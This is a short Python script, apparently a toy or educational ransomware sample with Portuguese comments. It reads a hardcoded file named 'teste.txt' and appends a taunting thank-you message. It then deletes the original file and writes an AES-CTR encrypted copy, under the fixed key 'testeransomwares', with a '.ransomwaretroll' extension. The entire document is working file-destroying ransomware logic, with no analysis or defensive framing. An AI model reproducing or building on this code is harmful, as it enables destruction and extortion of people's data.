import os
import pyaes

# open and read file

file_name = 'teste.txt'

with open(file_name, 'rb') as file:
    file_data = file.read()

# insert aditional message to file
aditional_message = '\nObrigado pela contribuicao e mais cuidado com seus arquivos\n'
file_data += aditional_message.encode()

# remove original file
os.remove(file_name)


# define encrypt key
key = b'testeransomwares'

aes = pyaes.AESModeOfOperationCTR(key)

# encrypt file
crypto_data = aes.encrypt(file_data)

# save encrypted file
new_file_name = file_name + '.ransomwaretroll'
with open(new_file_name, 'wb') as new_file:
    new_file.write(crypto_data)
